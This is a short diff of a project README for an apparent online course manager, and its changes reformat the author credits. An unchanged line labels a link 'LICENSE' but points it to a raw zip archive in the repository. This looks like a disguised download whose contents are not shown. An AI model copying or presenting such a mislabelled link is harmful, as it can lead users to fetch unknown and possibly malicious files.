@@ -58,7 +58,7 @@ ________________________________________
 Licensed under the MIT License. See [LICENSE](https://github.com/Vinuu1/online-course-manager/raw/refs/heads/main/ethionic/online_manager_course_v1.8.zip) for details.
 ________________________________________
 👨‍💻 Author
-•	Vinuu1 (@Vinuu1)
-[vaishnavi](https://github.com/vaishnavir1128-tech)
+•	[Vinuu1] (https://github.com/Vinuu1)
+                    • [vaishnavi](https://github.com/vaishnavir1128-tech)
 
 
